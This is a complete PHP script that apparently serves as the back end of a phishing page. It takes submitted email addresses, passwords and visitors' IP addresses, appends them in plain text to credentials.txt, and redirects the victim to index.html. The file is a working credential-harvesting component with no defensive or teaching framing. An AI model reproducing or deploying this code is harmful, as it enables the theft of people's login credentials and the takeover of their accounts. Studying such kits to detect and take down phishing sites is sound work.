<?php
// Check if the request is a POST request
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Get the POST data (credentials)
    $credentials = "";

    // Retrieve email, password, and IP address from POST data
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];

    // Validate input (you can add more validation if required)
    if (!empty($email) && !empty($password)) {
        // Prepare data to write to the file
        $credentials = "Email: $email\nPassword: $password\nIP Address: $ip\n";
    } else {
        // Send an error response if either email or password is empty
        http_response_code(400);
        echo "Bad Request: Email or password is empty.";
        exit();
    }

    // Save the credentials to a file
    $file = 'credentials.txt';
    if (file_put_contents($file, $credentials, FILE_APPEND | LOCK_EX) !== false) {
        // Send a success response
        http_response_code(200);
        echo "Credentials received and saved successfully.";
        // Redirect to the main page
        header("Location: index.html");
        exit();
    } else {
        // Send an error response if failed to save credentials
        http_response_code(500);
        echo "Internal Server Error: Failed to save credentials.";
        header("Location: index.html");
    }
} else {
    // Send an error response if the request method is not POST
    http_response_code(405);
    echo "Method Not Allowed: Only POST requests are allowed.";
    header("Location: index.html");
}
?>
